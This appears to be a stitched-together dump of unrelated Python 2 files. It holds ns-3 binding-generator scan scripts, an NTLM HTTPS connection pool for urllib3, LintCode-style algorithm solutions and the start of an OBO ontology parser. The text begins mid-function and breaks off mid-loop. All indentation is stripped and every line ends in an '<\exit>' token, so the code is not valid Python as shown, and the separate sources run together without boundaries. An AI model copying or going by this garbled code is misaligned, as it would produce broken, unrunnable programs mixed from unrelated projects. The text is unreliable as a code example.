print >> sys.stderr, pygccxml_definition<\exit>
if templates.is_instantiation(pygccxml_definition.decl_string):<\exit>
cls_name, template_parameters = templates.split(pygccxml_definition.name)<\exit>
template_parameters_decls = [find_declaration_from_name(module_parser.global_ns, templ_param)<\exit>
for templ_param in template_parameters]<\exit>
template_parameters_modules = []<\exit>
for templ in template_parameters_decls:<\exit>
if not hasattr(templ, 'location'):<\exit>
continue<\exit>
try:<\exit>
h = get_ns3_relative_path(templ.location.file_name)<\exit>
except ValueError:<\exit>
continue<\exit>
template_parameters_modules.append(self.headers_map[h])<\exit>
for templ_mod in template_parameters_modules:<\exit>
if templ_mod == self.module:<\exit>
definition_module = templ_mod<\exit>
break<\exit>
if definition_module != self.module:<\exit>
global_annotations['import_from_module'] = 'ns.%s' % (definition_module.replace('-', '_'),)<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::SimpleRefCount<'):<\exit>
global_annotations['incref_method'] = 'Ref'<\exit>
global_annotations['decref_method'] = 'Unref'<\exit>
global_annotations['peekref_method'] = 'GetReferenceCount'<\exit>
global_annotations['automatic_type_narrowing'] = 'true'<\exit>
return<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::Callback<'):<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::TracedCallback<'):<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::Ptr<'):<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
try:<\exit>
annotations = type_annotations[pygccxml_definition.decl_string]<\exit>
except KeyError:<\exit>
pass<\exit>
else:<\exit>
global_annotations.update(annotations)<\exit>
if isinstance(pygccxml_definition, enumeration_t):<\exit>
if definition_module != self.module:<\exit>
global_annotations['import_from_module'] = 'ns.%s' % definition_module<\exit>
if isinstance(pygccxml_definition, free_function_t):<\exit>
if definition_module != self.module:<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
if pygccxml_definition.name == 'PeekPointer':<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
if isinstance(pygccxml_definition, (free_function_t, member_function_t, constructor_t)):<\exit>
try:<\exit>
annotations = type_annotations[str(pygccxml_definition)]<\exit>
except KeyError:<\exit>
pass<\exit>
else:<\exit>
for key,value in annotations.items():<\exit>
if key == 'params':<\exit>
parameter_annotations.update (value)<\exit>
del annotations['params']<\exit>
global_annotations.update(annotations)<\exit>
def scan_callback_classes(module_parser, callback_classes_file):<\exit>
callback_classes_file.write("callback_classes = [\n")<\exit>
for cls in module_parser.module_namespace.classes(function=module_parser.location_filter,<\exit>
recursive=False):<\exit>
if not cls.name.startswith("Callback<"):<\exit>
continue<\exit>
assert templates.is_instantiation(cls.decl_string), "%s is not a template instantiation" % cls<\exit>
dummy_cls_name, template_parameters = templates.split(cls.decl_string)<\exit>
callback_classes_file.write("    %r,\n" % template_parameters)<\exit>
callback_classes_file.write("]\n")<\exit>
def ns3_module_scan(top_builddir, module_name, headers_map, output_file_name, cflags):<\exit>
module_parser = ModuleParser('ns.%s' % module_name.replace('-', '_'), 'ns3')<\exit>
module_parser.add_pre_scan_hook(PreScanHook(headers_map, module_name))<\exit>
gccxml_options = dict(<\exit>
include_paths=[top_builddir],<\exit>
define_symbols={<\exit>
},<\exit>
cflags=('--gccxml-cxxflags "%s -DPYTHON_SCAN"' % cflags)<\exit>
)<\exit>
try:<\exit>
os.unlink(output_file_name)<\exit>
except OSError:<\exit>
pass<\exit>
try:<\exit>
os.makedirs(os.path.dirname(output_file_name))<\exit>
except OSError:<\exit>
pass<\exit>
output_file = open(output_file_name, "wt")<\exit>
output_sink = FileCodeSink(output_file)<\exit>
scan_header = os.path.join(os.path.dirname(output_file_name), "scan-header.h")<\exit>
if not os.path.exists(scan_header):<\exit>
scan_header = os.path.join(top_builddir, "ns3", "%s-module.h" % module_name)<\exit>
module_parser.parse_init([scan_header],<\exit>
None, whitelist_paths=[top_builddir],<\exit>
pygen_sink=output_sink,<\exit>
gccxml_options=gccxml_options)<\exit>
module_parser.scan_types()<\exit>
callback_classes_file = open(os.path.join(os.path.dirname(output_file_name), "callbacks_list.py"), "wt")<\exit>
scan_callback_classes(module_parser, callback_classes_file)<\exit>
callback_classes_file.close()<\exit>
module_parser.scan_methods()<\exit>
module_parser.scan_functions()<\exit>
module_parser.parse_finalize()<\exit>
output_file.close()<\exit>
os.chmod(output_file_name, 0400)<\exit>
if __name__ == '__main__':<\exit>
if len(sys.argv) != 6:<\exit>
print "ns3modulescan-modular.py top_builddir module_path module_headers output_file_name cflags"<\exit>
sys.exit(1)<\exit>
ns3_module_scan(sys.argv[1], sys.argv[2], eval(sys.argv[3]), sys.argv[4], sys.argv[5])<\exit>
sys.exit(0)<\exit>
import sys<\exit>
import os.path<\exit>
import pybindgen.settings<\exit>
from pybindgen.gccxmlparser import ModuleParser, PygenClassifier, PygenSection, WrapperWarning<\exit>
from pybindgen.typehandlers.codesink import FileCodeSink<\exit>
from pygccxml.declarations import templates<\exit>
from pygccxml.declarations.class_declaration import class_t<\exit>
from pygccxml.declarations.calldef import free_function_t, member_function_t, constructor_t, calldef_t<\exit>
import ns3modulegen_core_customizations<\exit>
class ErrorHandler(pybindgen.settings.ErrorHandler):<\exit>
def handle_error(self, dummy_wrapper, dummy_exception, dummy_traceback_):<\exit>
return True<\exit>
pybindgen.settings.error_handler = ErrorHandler()<\exit>
import warnings<\exit>
warnings.filterwarnings(category=WrapperWarning, action='ignore')<\exit>
type_annotations = {<\exit>
'::ns3::AttributeChecker': {<\exit>
'automatic_type_narrowing': 'true',<\exit>
'allow_subclassing': 'false',<\exit>
},<\exit>
'::ns3::AttributeValue': {<\exit>
'automatic_type_narrowing': 'true',<\exit>
'allow_subclassing': 'false',<\exit>
},<\exit>
'::ns3::CommandLine': {<\exit>
'allow_subclassing': 'true',<\exit>
},<\exit>
'::ns3::NscTcpL4Protocol': {<\exit>
'ignore': 'true',<\exit>
},<\exit>
'ns3::RandomVariable::RandomVariable(ns3::RandomVariableBase const & variable) [constructor]': {<\exit>
'ignore': None,<\exit>
},<\exit>
'ns3::RandomVariableBase * ns3::RandomVariable::Peek() const [member function]': {<\exit>
'ignore': None,<\exit>
},<\exit>
'void ns3::RandomVariable::GetSeed(uint32_t * seed) const [member function]': {<\exit>
'params': {'seed':{'direction':'out',<\exit>
'array_length':'6'}}<\exit>
},<\exit>
'bool ns3::TypeId::LookupAttributeByName(std::string name, ns3::TypeId::AttributeInfo * info) const [member function]': {<\exit>
'params': {'info':{'transfer_ownership': 'false'}}<\exit>
},<\exit>
'static bool ns3::TypeId::LookupByNameFailSafe(std::string name, ns3::TypeId * tid) [member function]': {<\exit>
'ignore': None,<\exit>
},<\exit>
'bool ns3::TraceSourceAccessor::ConnectWithoutContext(ns3::ObjectBase * obj, ns3::CallbackBase const & cb) const [member function]': {<\exit>
'params': {'obj': {'transfer_ownership':'false'}}<\exit>
},<\exit>
'bool ns3::TraceSourceAccessor::Connect(ns3::ObjectBase * obj, std::string context, ns3::CallbackBase const & cb) const [member function]': {<\exit>
'params': {'obj': {'transfer_ownership':'false'}}<\exit>
},<\exit>
'bool ns3::TraceSourceAccessor::DisconnectWithoutContext(ns3::ObjectBase * obj, ns3::CallbackBase const & cb) const [member function]': {<\exit>
'params': {'obj': {'transfer_ownership':'false'}}<\exit>
},<\exit>
'bool ns3::TraceSourceAccessor::Disconnect(ns3::ObjectBase * obj, std::string context, ns3::CallbackBase const & cb) const [member function]': {<\exit>
'params': {'obj': {'transfer_ownership':'false'}}<\exit>
},<\exit>
'bool ns3::AttributeAccessor::Set(ns3::ObjectBase * object, ns3::AttributeValue const & value) const [member function]': {<\exit>
'params': {'object': {'transfer_ownership':'false'}}<\exit>
},<\exit>
'ns3::EmpiricalVariable::EmpiricalVariable(ns3::RandomVariableBase const & variable) [constructor]': {<\exit>
'ignore': None<\exit>
},<\exit>
'static ns3::AttributeList * ns3::AttributeList::GetGlobal() [member function]': {<\exit>
'caller_owns_return': 'false'<\exit>
},<\exit>
'void ns3::CommandLine::Parse(int argc, char * * argv) const [member function]': {<\exit>
'ignore': None<\exit>
},<\exit>
'extern void ns3::PythonCompleteConstruct(ns3::Ptr<ns3::Object> object, ns3::TypeId typeId, ns3::AttributeList const & attributes) [free function]': {<\exit>
'ignore': None<\exit>
},<\exit>
'ns3::Ptr<ns3::Ipv4RoutingProtocol> ns3::Ipv4ListRouting::GetRoutingProtocol(uint32_t index, int16_t & priority) const [member function]': {<\exit>
'params': {'priority':{'direction':'out'}}<\exit>
},<\exit>
'ns3::Ipv4RoutingTableEntry * ns3::GlobalRouter::GetInjectedRoute(uint32_t i) [member function]': {<\exit>
'params': {'return': { 'caller_owns_return': 'false',}},<\exit>
},<\exit>
'ns3::Ipv4RoutingTableEntry * ns3::Ipv4GlobalRouting::GetRoute(uint32_t i) const [member function]': {<\exit>
'params': {'return': { 'caller_owns_return': 'false',}},<\exit>
},<\exit>
'::ns3::TestCase': {<\exit>
'ignore': 'true',<\exit>
},<\exit>
'::ns3::TestRunner': {<\exit>
'ignore': 'true',<\exit>
},<\exit>
'::ns3::TestSuite': {<\exit>
'ignore': 'true',<\exit>
},<\exit>
}<\exit>
def get_ns3_relative_path(path):<\exit>
l = []<\exit>
head = path<\exit>
while head:<\exit>
head, tail = os.path.split(head)<\exit>
if tail == 'ns3':<\exit>
return os.path.join(*l)<\exit>
l.insert(0, tail)<\exit>
raise AssertionError("is the path %r inside ns3?!" % path)<\exit>
def pre_scan_hook(dummy_module_parser,<\exit>
pygccxml_definition,<\exit>
global_annotations,<\exit>
parameter_annotations):<\exit>
ns3_header = get_ns3_relative_path(pygccxml_definition.location.file_name)<\exit>
global_annotations['pygen_comment'] = "%s: %s" % \<\exit>
(ns3_header, pygccxml_definition)<\exit>
if isinstance(pygccxml_definition, member_function_t) \<\exit>
and pygccxml_definition.parent.name == 'Object' \<\exit>
and pygccxml_definition.name == 'GetObject':<\exit>
template_args = templates.args(pygccxml_definition.demangled_name)<\exit>
if template_args == ['ns3::Object']:<\exit>
global_annotations['template_instance_names'] = 'ns3::Object=>GetObject'<\exit>
if isinstance(pygccxml_definition, member_function_t) \<\exit>
and pygccxml_definition.parent.name == 'Simulator' \<\exit>
and pygccxml_definition.name.startswith('Schedule'):<\exit>
global_annotations['ignore'] = None<\exit>
if isinstance(pygccxml_definition, member_function_t) \<\exit>
and pygccxml_definition.parent.name == 'Simulator' \<\exit>
and pygccxml_definition.name == 'Run':<\exit>
global_annotations['ignore'] = True<\exit>
if isinstance(pygccxml_definition, calldef_t):<\exit>
for arg in pygccxml_definition.arguments:<\exit>
if arg.default_value is None:<\exit>
continue<\exit>
if "ns3::MilliSeconds( )" == arg.default_value:<\exit>
arg.default_value = "ns3::MilliSeconds(0)"<\exit>
if "ns3::Seconds( )" == arg.default_value:<\exit>
arg.default_value = "ns3::Seconds(0)"<\exit>
if isinstance(pygccxml_definition, class_t):<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::SimpleRefCount<'):<\exit>
global_annotations['incref_method'] = 'Ref'<\exit>
global_annotations['decref_method'] = 'Unref'<\exit>
global_annotations['peekref_method'] = 'GetReferenceCount'<\exit>
global_annotations['automatic_type_narrowing'] = 'true'<\exit>
return<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::Callback<'):<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::TracedCallback<'):<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
if pygccxml_definition.decl_string.startswith('::ns3::Ptr<'):<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
try:<\exit>
annotations = type_annotations[pygccxml_definition.decl_string]<\exit>
except KeyError:<\exit>
pass<\exit>
else:<\exit>
global_annotations.update(annotations)<\exit>
if isinstance(pygccxml_definition, free_function_t):<\exit>
if pygccxml_definition.name == 'PeekPointer':<\exit>
global_annotations['ignore'] = None<\exit>
return<\exit>
if isinstance(pygccxml_definition, (free_function_t, member_function_t, constructor_t)):<\exit>
try:<\exit>
annotations = type_annotations[str(pygccxml_definition)]<\exit>
except KeyError:<\exit>
pass<\exit>
else:<\exit>
for key,value in annotations.items():<\exit>
if key == 'params':<\exit>
parameter_annotations.update (value)<\exit>
del annotations['params']<\exit>
global_annotations.update(annotations)<\exit>
def scan_callback_classes(module_parser, callback_classes_file):<\exit>
callback_classes_file.write("callback_classes = [\n")<\exit>
for cls in module_parser.module_namespace.classes(function=module_parser.location_filter,<\exit>
recursive=False):<\exit>
if not cls.name.startswith("Callback<"):<\exit>
continue<\exit>
assert templates.is_instantiation(cls.decl_string), "%s is not a template instantiation" % cls<\exit>
dummy_cls_name, template_parameters = templates.split(cls.decl_string)<\exit>
callback_classes_file.write("    %r,\n" % template_parameters)<\exit>
callback_classes_file.write("]\n")<\exit>
class MyPygenClassifier(PygenClassifier):<\exit>
def __init__(self, headers_map, section_precendences):<\exit>
self.headers_map = headers_map<\exit>
self.section_precendences = section_precendences<\exit>
def classify(self, pygccxml_definition):<\exit>
name = os.path.basename(pygccxml_definition.location.file_name)<\exit>
try:<\exit>
return self.headers_map[name]<\exit>
except KeyError:<\exit>
return '__main__'<\exit>
def get_section_precedence(self, section_name):<\exit>
if section_name == '__main__':<\exit>
return -1<\exit>
return self.section_precendences[section_name]<\exit>
def ns3_module_scan(top_builddir, pygen_file_name, everything_h, cflags):<\exit>
ns3_modules = eval(sys.stdin.readline())<\exit>
from topsort import topsort<\exit>
graph = []<\exit>
module_names = ns3_modules.keys()<\exit>
module_names.sort()<\exit>
for ns3_module_name in module_names:<\exit>
ns3_module_deps = list(ns3_modules[ns3_module_name][0])<\exit>
ns3_module_deps.sort()<\exit>
for dep in ns3_module_deps:<\exit>
graph.append((dep, ns3_module_name))<\exit>
sorted_ns3_modules = topsort(graph)<\exit>
sections = [PygenSection('__main__', FileCodeSink(open(pygen_file_name, "wt")))]<\exit>
headers_map = {}<\exit>
section_precendences = {}<\exit>
for prec, ns3_module in enumerate(sorted_ns3_modules):<\exit>
section_name = "ns3_module_%s" % ns3_module.replace('-', '_')<\exit>
file_name = os.path.join(os.path.dirname(pygen_file_name), "%s.py" % section_name)<\exit>
sections.append(PygenSection(section_name, FileCodeSink(open(file_name, "wt")),<\exit>
section_name + "__local"))<\exit>
for header in ns3_modules[ns3_module][1]:<\exit>
headers_map[header] = section_name<\exit>
section_precendences[section_name] = prec<\exit>
module_parser = ModuleParser('ns3', 'ns3')<\exit>
module_parser.add_pre_scan_hook(pre_scan_hook)<\exit>
gccxml_options = dict(<\exit>
include_paths=[top_builddir],<\exit>
define_symbols={<\exit>
},<\exit>
cflags=('--gccxml-cxxflags "%s -DPYTHON_SCAN"' % cflags)<\exit>
)<\exit>
module_parser.parse_init([everything_h],<\exit>
None, whitelist_paths=[top_builddir, os.path.dirname(everything_h)],<\exit>
pygen_sink=sections,<\exit>
pygen_classifier=MyPygenClassifier(headers_map, section_precendences),<\exit>
gccxml_options=gccxml_options)<\exit>
module_parser.scan_types()<\exit>
callback_classes_file = open(os.path.join(os.path.dirname(pygen_file_name), "callbacks_list.py"), "wt")<\exit>
scan_callback_classes(module_parser, callback_classes_file)<\exit>
callback_classes_file.close()<\exit>
module_parser.scan_methods()<\exit>
module_parser.scan_functions()<\exit>
module_parser.parse_finalize()<\exit>
for section in sections:<\exit>
section.code_sink.file.close()<\exit>
if __name__ == '__main__':<\exit>
ns3_module_scan(sys.argv[1], sys.argv[3], sys.argv[2], sys.argv[4])<\exit>
from _ns3 import *<\exit>
import atexit<\exit>
atexit.register(Simulator.Destroy)<\exit>
del atexit<\exit>
try:<\exit>
from http.client import HTTPSConnection<\exit>
except ImportError:<\exit>
from httplib import HTTPSConnection<\exit>
from logging import getLogger<\exit>
from ntlm import ntlm<\exit>
from urllib3 import HTTPSConnectionPool<\exit>
log = getLogger(__name__)<\exit>
class NTLMConnectionPool(HTTPSConnectionPool):<\exit>
scheme = 'https'<\exit>
def __init__(self, user, pw, authurl, *args, **kwargs):<\exit>
super(NTLMConnectionPool, self).__init__(*args, **kwargs)<\exit>
self.authurl = authurl<\exit>
self.rawuser = user<\exit>
user_parts = user.split('\\', 1)<\exit>
self.domain = user_parts[0].upper()<\exit>
self.user = user_parts[1]<\exit>
self.pw = pw<\exit>
def _new_conn(self):<\exit>
self.num_connections += 1<\exit>
log.debug('Starting NTLM HTTPS connection no. %d: https://%s%s' %<\exit>
(self.num_connections, self.host, self.authurl))<\exit>
headers = {}<\exit>
headers['Connection'] = 'Keep-Alive'<\exit>
req_header = 'Authorization'<\exit>
resp_header = 'www-authenticate'<\exit>
conn = HTTPSConnection(host=self.host, port=self.port)<\exit>
headers[req_header] = (<\exit>
'NTLM %s' % ntlm.create_NTLM_NEGOTIATE_MESSAGE(self.rawuser))<\exit>
log.debug('Request headers: %s' % headers)<\exit>
conn.request('GET', self.authurl, None, headers)<\exit>
res = conn.getresponse()<\exit>
reshdr = dict(res.getheaders())<\exit>
log.debug('Response status: %s %s' % (res.status, res.reason))<\exit>
log.debug('Response headers: %s' % reshdr)<\exit>
log.debug('Response data: %s [...]' % res.read(100))<\exit>
res.fp = None<\exit>
auth_header_values = reshdr[resp_header].split(', ')<\exit>
auth_header_value = None<\exit>
for s in auth_header_values:<\exit>
if s[:5] == 'NTLM ':<\exit>
auth_header_value = s[5:]<\exit>
if auth_header_value is None:<\exit>
raise Exception('Unexpected %s response header: %s' %<\exit>
(resp_header, reshdr[resp_header]))<\exit>
ServerChallenge, NegotiateFlags = \<\exit>
ntlm.parse_NTLM_CHALLENGE_MESSAGE(auth_header_value)<\exit>
auth_msg = ntlm.create_NTLM_AUTHENTICATE_MESSAGE(ServerChallenge,<\exit>
self.user,<\exit>
self.domain,<\exit>
self.pw,<\exit>
NegotiateFlags)<\exit>
headers[req_header] = 'NTLM %s' % auth_msg<\exit>
log.debug('Request headers: %s' % headers)<\exit>
conn.request('GET', self.authurl, None, headers)<\exit>
res = conn.getresponse()<\exit>
log.debug('Response status: %s %s' % (res.status, res.reason))<\exit>
log.debug('Response headers: %s' % dict(res.getheaders()))<\exit>
log.debug('Response data: %s [...]' % res.read()[:100])<\exit>
if res.status != 200:<\exit>
if res.status == 401:<\exit>
raise Exception('Server rejected request: wrong '<\exit>
'username or password')<\exit>
raise Exception('Wrong server response: %s %s' %<\exit>
(res.status, res.reason))<\exit>
res.fp = None<\exit>
log.debug('Connection established')<\exit>
return conn<\exit>
def urlopen(self, method, url, body=None, headers=None, retries=3,<\exit>
redirect=True, assert_same_host=True):<\exit>
if headers is None:<\exit>
headers = {}<\exit>
headers['Connection'] = 'Keep-Alive'<\exit>
return super(NTLMConnectionPool, self).urlopen(method, url, body,<\exit>
headers, retries,<\exit>
redirect,<\exit>
assert_same_host)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K, A = cipher<\exit>
total = N * (N + 1) / 2<\exit>
total_only_s = 0<\exit>
i = 0<\exit>
while i < N:<\exit>
if A[i] > K:<\exit>
i += 1<\exit>
else:<\exit>
j = i + 1<\exit>
while j < N and A[j] <= K: j += 1<\exit>
l = j - i<\exit>
total_only_s += l * (l + 1) / 2<\exit>
i = j<\exit>
return total - total_only_s<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N, K = map(int, f.readline().strip().split(' '))<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, K, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Interval(object):<\exit>
def __init__(self, start, end):<\exit>
self.start = start<\exit>
self.end = end<\exit>
class Solution:<\exit>
@staticmethod<\exit>
def cmp(a, b):<\exit>
if a.start != b.start:<\exit>
return a.start-b.start<\exit>
else:<\exit>
return a.end-b.end<\exit>
def countOfAirplanes(self, airplanes):<\exit>
return self.count_heap(airplanes)<\exit>
def count_heap(self, intervals):<\exit>
import heapq<\exit>
intervals.sort(cmp=Solution.cmp)<\exit>
heap = []<\exit>
cnt = 0<\exit>
for intv in intervals:<\exit>
heapq.heappush(heap, intv.end)<\exit>
while heap[0] <= intv.start:<\exit>
heapq.heappop(heap)<\exit>
cnt = max(cnt, len(heap))<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countOfAirplanes([Interval(i[0], i[1]) for i in [[1, 10], [2, 3], [5, 8], [4, 7]]]) == 3<\exit>
import random<\exit>
class Point(object):<\exit>
def __init__(self, a=0, b=0):<\exit>
self.x = a<\exit>
self.y = b<\exit>
def __repr__(self):<\exit>
return "[%d, %d]" % (self.x, self.y)<\exit>
class UnionFind(object):<\exit>
def __init__(self, rows, cols):<\exit>
self.pi = [-1 for _ in xrange(rows*cols)]<\exit>
self.sz = [-1 for _ in xrange(rows*cols)]<\exit>
self.count = 0<\exit>
def add(self, item):<\exit>
if self.pi[item] == -1:<\exit>
self.pi[item] = item<\exit>
self.sz[item] = 1<\exit>
self.count += 1<\exit>
def union(self, a, b):<\exit>
pi1 = self._pi(a)<\exit>
pi2 = self._pi(b)<\exit>
if pi1 != pi2:<\exit>
if self.sz[pi1] > self.sz[pi2]:<\exit>
pi1, pi2 = pi2, pi1<\exit>
self.pi[pi1] = pi2<\exit>
self.sz[pi2] += self.sz[pi1]<\exit>
self.count -= 1<\exit>
def _pi(self, item):<\exit>
pi = self.pi[item]<\exit>
if item != pi:<\exit>
self.pi[item] = self._pi(pi)<\exit>
return self.pi[item]<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))<\exit>
def numIslands2(self, n, m, operators):<\exit>
rows = n<\exit>
cols = m<\exit>
unroll = lambda x, y: x*cols+y<\exit>
mat = [[0 for _ in xrange(cols)] for _ in xrange(rows)]<\exit>
uf = UnionFind(rows, cols)<\exit>
ret = []<\exit>
for op in operators:<\exit>
uf.add(unroll(op.x, op.y))<\exit>
mat[op.x][op.y] = 1<\exit>
for dir in self.dirs:<\exit>
x1 = op.x+dir[0]<\exit>
y1 = op.y+dir[1]<\exit>
if 0 <= x1 < rows and 0 <= y1 < cols and mat[x1][y1] == 1:<\exit>
uf.union(unroll(op.x, op.y), unroll(x1, y1))<\exit>
ret.append(uf.count)<\exit>
return ret<\exit>
class TestCaseGenerator(object):<\exit>
def _generate(self):<\exit>
dim = 10<\exit>
m = random.randrange(1, dim)<\exit>
n = random.randrange(1, dim)<\exit>
k = random.randrange(1, max(2, m*n/3))<\exit>
operators = []<\exit>
visited = set()<\exit>
while len(operators) < k:<\exit>
p = random.randrange(m*n)<\exit>
if p not in visited:<\exit>
x = p/n<\exit>
y = p%n<\exit>
operators.append(Point(x, y))<\exit>
visited.add(p)<\exit>
print(m)<\exit>
print(n)<\exit>
print(operators)<\exit>
def generate(self, T=50):<\exit>
for _ in xrange(T):<\exit>
self._generate()<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numIslands2(3, 3, map(lambda x: Point(x[0], x[1]), [(0, 0), (0, 1), (2, 2), (2, 1)])) == [1, 1, 2,<\exit>
2]<\exit>
testcase = TestCaseGenerator()<\exit>
testcase.generate()<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.dirs = [[0, -1], [0, 1], [1, 0], [-1, 0]]<\exit>
def numIslands(self, grid):<\exit>
if not grid: return 0<\exit>
m = len(grid)<\exit>
if not m: return 0<\exit>
n = len(grid[0])<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
cnt = 0<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if not visited[i][j] and grid[i][j]:<\exit>
cnt += 1<\exit>
self.dfs(grid, i, j, visited)<\exit>
return cnt<\exit>
def dfs(self, grid, i, j, visited):<\exit>
m = len(grid)<\exit>
n = len(grid[0])<\exit>
visited[i][j] = True<\exit>
for dir in self.dirs:<\exit>
i1 = i+dir[0]<\exit>
j1 = j+dir[1]<\exit>
if 0 <= i1 < m and 0 <= j1 < n and not visited[i1][j1] and grid[i1][j1]:<\exit>
self.dfs(grid, i1, j1, visited)<\exit>
try:<\exit>
from lintcode import Compare<\exit>
except ImportError:<\exit>
class Compare:<\exit>
@classmethod<\exit>
def cmp(cls, a, b):<\exit>
a = a.lower()<\exit>
b = b.lower()<\exit>
diff = ord(a)-ord(b)<\exit>
if diff < 0:<\exit>
return -1<\exit>
elif diff > 0:<\exit>
return 1<\exit>
else:<\exit>
return 0<\exit>
class Solution:<\exit>
def sortNutsAndBolts(self, nuts, bolts):<\exit>
assert len(nuts) == len(bolts)<\exit>
self.quick_sort(nuts, bolts, 0, len(nuts))<\exit>
def quick_sort(self, nuts, bolts, start, end):<\exit>
if start >= end:<\exit>
return<\exit>
pivot = self.partition(nuts, bolts[start], start, end)<\exit>
self.partition(bolts, nuts[pivot], start, end)<\exit>
self.quick_sort(nuts, bolts, start, pivot)<\exit>
self.quick_sort(nuts, bolts, pivot+1, end)<\exit>
def partition(self, A, pivot, start, end):<\exit>
left = start<\exit>
i = start+1<\exit>
while i < end:<\exit>
if Compare.cmp(A[i], pivot) == -1 or Compare.cmp(pivot, A[i]) == 1:<\exit>
left += 1<\exit>
A[left], A[i] = A[i], A[left]<\exit>
i += 1<\exit>
elif Compare.cmp(A[i], pivot) == 0 or Compare.cmp(pivot, A[i]) == 0:<\exit>
A[start], A[i] = A[i], A[start]<\exit>
else:<\exit>
i += 1<\exit>
A[start], A[left] = A[left], A[start]<\exit>
return left<\exit>
if __name__ == "__main__":<\exit>
nuts = ['a', 'b', 'd', 'g']<\exit>
bolts = ['A', 'G', 'D', 'B']<\exit>
Solution().sortNutsAndBolts(nuts, bolts)<\exit>
assert nuts == ['a', 'b', 'd', 'g']<\exit>
assert bolts == ['A', 'B', 'D', 'G']<\exit>
import sys<\exit>
import re<\exit>
from string import lowercase<\exit>
options = None<\exit>
def case_normalize_initial(s):<\exit>
if re.match(r'^[A-Z][a-z]{2,}', s):<\exit>
return s[0].lower()+s[1:]<\exit>
else:<\exit>
return s<\exit>
def case_normalize_all_words(s):<\exit>
return " ".join([case_normalize_initial(w) for w in s.split(" ")])<\exit>
class Term:<\exit>
def __init__(self, tid, name, synonyms=None, defs=None,<\exit>
is_a=None, part_of=None):<\exit>
self.tid      = tid<\exit>
self.name     = name<\exit>
self.synonyms = synonyms if synonyms is not None else []<\exit>
self.defs     = defs     if defs     is not None else []<\exit>
self.is_a     = is_a     if is_a     is not None else []<\exit>
self.part_of  = part_of  if part_of  is not None else []<\exit>
self.parents  = []<\exit>
self.children = []<\exit>
self.objects    = []<\exit>
self.components = []<\exit>
self.cleanup()<\exit>
def obo_idspace(self):<\exit>
if ":" in self.tid:<\exit>
s = self.tid[:self.tid.index(":")]<\exit>
if len([c for c in s if c in lowercase]) == len(s):<\exit>
return s.upper()<\exit>
else:<\exit>
return s<\exit>
else:<\exit>
m = re.match(r'^(.[A-Za-z_]+)', self.tid)<\exit>
return m.group(1)<\exit>
def resolve_references(self, term_by_id, term_by_name=None):<\exit>
for ptid, pname in self.is_a:<\exit>
if ptid not in term_by_id:<\exit>
print >> sys.stderr, "Warning: is_a term '%s' not found, ignoring" % ptid<\exit>
continue<\exit>
parent = term_by_id[ptid]<\exit>
if pname is not None and term_by_name is not None and term_by_name[pname] is not None:<\exit>
assert parent == term_by_name[pname]<\exit>
if self in parent.children:<\exit>
print >> sys.stderr, "Warning: dup is-a parent %s for %s, ignoring" % (ptid, str(self))<\exit>
else:<\exit>
self.parents.append(parent)<\exit>
parent.children.append(self)<\exit>
for prel, ptid, pname in self.part_of:<\exit>
if ptid not in term_by_id:<\exit>
print >> sys.stderr, "Error: part_of term '%s' not found, ignoring" % ptid<\exit>
continue<\exit>
pobject = term_by_id[ptid]<\exit>
if pname is not None and term_by_name is not None and term_by_name[pname] is not None:<\exit>
assert pobject == term_by_name[pname]<\exit>
if self in pobject.components:<\exit>
print >> sys.stderr, "Warning: dup part-of parent %s for %s, ignoring" % (ptid, str(self))<\exit>
else:<\exit>
self.objects.append((prel, pobject))<\exit>
pobject.components.append((prel, self))<\exit>
def _case_normalize(self, cn_func):<\exit>
self.name = cn_func(self.name)<\exit>
for i in range(len(self.synonyms)):<\exit>
self.synonyms[i] = (cn_func(self.synonyms[i][0]), self.synonyms[i][1])<\exit>
for i in range(len(self.is_a)):<\exit>
if self.is_a[i][1] is not None:<\exit>
self.is_a[i] = (self.is_a[i][0], cn_func(self.is_a[i][1]))<\exit>
def case_normalize_initial(self):<\exit>
global case_normalize_initial<\exit>
self._case_normalize(case_normalize_initial)<\exit>
def case_normalize_all_words(self):<\exit>
global case_normalize_all_words<\exit>
self._case_normalize(case_normalize_all_words)<\exit>
def cleanup(self):<\exit>
for i, s in enumerate(self.synonyms):<\exit>
if s[-1] == ".":<\exit>
if re.search(r'\b[a-z]{2,}\.$', s):<\exit>
c = s[:-1]<\exit>
print >> sys.stderr, "Note: cleanup: '%s' -> '%s'" % (s, c)<\exit>
self.synonyms[i] = c<\exit>
def __str__(self):<\exit>
return "%s (%s)" % (self.name, self.tid)<\exit>
def parse_obo(f, limit_prefixes=None, include_nameless=False):<\exit>
all_terms = []<\exit>
term_by_id = {}<\exit>
skip_block = True<\exit>
tid, prefix, name, synonyms, definitions, is_a, part_of, obsolete = None, None, None, [], [], [], [], False<\exit>
for ln, l in enumerate(f):<\exit>
if l.strip() == "[Term]":<\exit>
assert tid is None<\exit>
assert name is None<\exit>
assert is_a == []<\exit>
skip_block = False<\exit>
if l.strip() == "[Typedef]":<\exit>
skip_block = True<\exit>
